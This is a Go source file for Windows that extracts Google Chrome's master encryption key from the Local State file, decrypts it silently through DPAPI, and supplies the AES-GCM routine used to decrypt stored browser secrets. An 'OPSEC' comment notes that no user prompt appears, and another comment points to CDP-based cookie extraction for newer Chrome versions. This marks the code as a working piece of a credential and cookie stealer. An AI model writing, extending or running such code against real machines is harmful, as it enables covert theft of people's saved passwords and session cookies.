//go:build windows

package chromium

import (
	"crypto/aes"
	"crypto/cipher"
	"encoding/base64"
	"fmt"
	"os"
	"unsafe"

	"golang.org/x/sys/windows"
)

// dataBlob is the Windows DATA_BLOB structure used by DPAPI.
type dataBlob struct {
	cbData uint32
	pbData *byte
}

// GetChromeKey retrieves the AES-256 key from Chrome's Local State on Windows.
//
// The key is stored as base64 in Local State -> os_crypt.encrypted_key,
// prefixed with "DPAPI" (5 bytes). After stripping the prefix, the key is
// decrypted using CryptUnprotectData (DPAPI).
//
// OPSEC: DPAPI decryption is SILENT — no user prompt. It uses the current
// user's credentials transparently.
//
// NOTE: Chrome >= 127 uses app-bound encryption (v20 prefix) via the
// IElevation COM interface. This implementation does NOT handle v20 —
// use CDP-based cookie extraction for Chrome 127+ v20 cookies.
func GetChromeKey(allowPrompt bool) ([]byte, error) {
	// We need the browser data dir to find Local State.
	// Use the platform package's ChromeUserDataDir via the caller, but for
	// the Windows key extraction we read Local State from the standard path.
	// The caller should pass browserDataDir to ReadLocalState instead.
	// For standalone key extraction, we read from the default Chrome location.
	localAppData := os.Getenv("LOCALAPPDATA")
	if localAppData == "" {
		home, _ := os.UserHomeDir()
		localAppData = home + `\AppData\Local`
	}
	browserDataDir := localAppData + `\Google\Chrome\User Data`

	return getChromeKeyFromDir(browserDataDir)
}

// getChromeKeyFromDir reads and decrypts the Chrome key from a specific directory.
func getChromeKeyFromDir(browserDataDir string) ([]byte, error) {
	localState, err := ReadLocalState(browserDataDir)
	if err != nil {
		return nil, fmt.Errorf("read Local State: %w", err)
	}

	osCrypt, ok := localState["os_crypt"].(map[string]any)
	if !ok {
		return nil, fmt.Errorf("os_crypt not found in Local State")
	}

	encryptedKeyB64, ok := osCrypt["encrypted_key"].(string)
	if !ok || encryptedKeyB64 == "" {
		return nil, fmt.Errorf("encrypted_key not found in Local State")
	}

	encryptedKey, err := base64.StdEncoding.DecodeString(encryptedKeyB64)
	if err != nil {
		return nil, fmt.Errorf("base64 decode encrypted_key: %w", err)
	}

	// Strip "DPAPI" prefix (5 bytes).
	if len(encryptedKey) > 5 && string(encryptedKey[:5]) == "DPAPI" {
		encryptedKey = encryptedKey[5:]
	}

	// Decrypt using DPAPI CryptUnprotectData.
	key, err := cryptUnprotectData(encryptedKey)
	if err != nil {
		return nil, fmt.Errorf("DPAPI decrypt: %w", err)
	}

	return key, nil
}

// cryptUnprotectData calls the Windows DPAPI CryptUnprotectData function.
func cryptUnprotectData(data []byte) ([]byte, error) {
	if len(data) == 0 {
		return nil, fmt.Errorf("empty DPAPI input")
	}

	crypt32 := windows.NewLazySystemDLL("crypt32.dll")
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	procCryptUnprotectData := crypt32.NewProc("CryptUnprotectData")
	procLocalFree := kernel32.NewProc("LocalFree")

	inputBlob := dataBlob{
		cbData: uint32(len(data)),
		pbData: &data[0],
	}
	var outputBlob dataBlob

	r, _, err := procCryptUnprotectData.Call(
		uintptr(unsafe.Pointer(&inputBlob)),
		0,    // pszDataDescr
		0,    // pOptionalEntropy
		0,    // pvReserved
		0,    // pPromptStruct
		0,    // dwFlags
		uintptr(unsafe.Pointer(&outputBlob)),
	)

	if r == 0 {
		return nil, fmt.Errorf("CryptUnprotectData failed: %w", err)
	}

	// Copy the output before freeing.
	output := make([]byte, outputBlob.cbData)
	copy(output, unsafe.Slice(outputBlob.pbData, outputBlob.cbData))

	// Free the DPAPI-allocated buffer.
	procLocalFree.Call(uintptr(unsafe.Pointer(outputBlob.pbData)))

	return output, nil
}

// DecryptAESGCM decrypts AES-256-GCM encrypted data (Windows v10/v20 format).
//
// Format: [12-byte nonce][ciphertext + 16-byte GCM tag]
func DecryptAESGCM(data, key []byte) (string, error) {
	if len(data) < 12+16 {
		return "", fmt.Errorf("ciphertext too short for AES-GCM")
	}

	nonce := data[:12]
	ciphertextWithTag := data[12:]

	block, err := aes.NewCipher(key)
	if err != nil {
		return "", fmt.Errorf("aes cipher: %w", err)
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return "", fmt.Errorf("gcm: %w", err)
	}

	plaintext, err := gcm.Open(nil, nonce, ciphertextWithTag, nil)
	if err != nil {
		return "", fmt.Errorf("gcm decrypt: %w", err)
	}

	return string(plaintext), nil
}

// decryptPlatform dispatches to the windows AES-GCM decryptor.
func decryptPlatform(data, key []byte) (string, error) {
	return DecryptAESGCM(data, key)
}
